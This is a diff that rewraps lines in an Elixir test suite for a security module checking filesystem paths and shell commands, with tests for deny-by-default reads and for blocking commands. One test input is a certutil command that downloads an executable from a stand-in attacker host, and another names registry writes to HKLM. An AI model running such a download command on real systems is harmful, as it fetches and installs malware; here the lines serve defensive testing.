@@ -81,7 +81,9 @@ defmodule Traitee.Security.FilesystemTest do
 
   describe "check_path/2 with deny-by-default policy" do
     test "denies arbitrary paths when no allow rules are configured" do
-      assert {:error, msg} = Filesystem.check_path("/home/user/documents/notes.txt", operation: :read)
+      assert {:error, msg} =
+               Filesystem.check_path("/home/user/documents/notes.txt", operation: :read)
+
       assert msg =~ "deny"
     end
   end
@@ -124,7 +126,8 @@ defmodule Traitee.Security.FilesystemTest do
     end
 
     test "blocks certutil URL cache" do
-      assert {:error, _} = Filesystem.check_command("certutil -urlcache -split -f http://evil.com/mal.exe")
+      assert {:error, _} =
+               Filesystem.check_command("certutil -urlcache -split -f http://evil.com/mal.exe")
     end
 
     test "blocks reg add HKLM" do
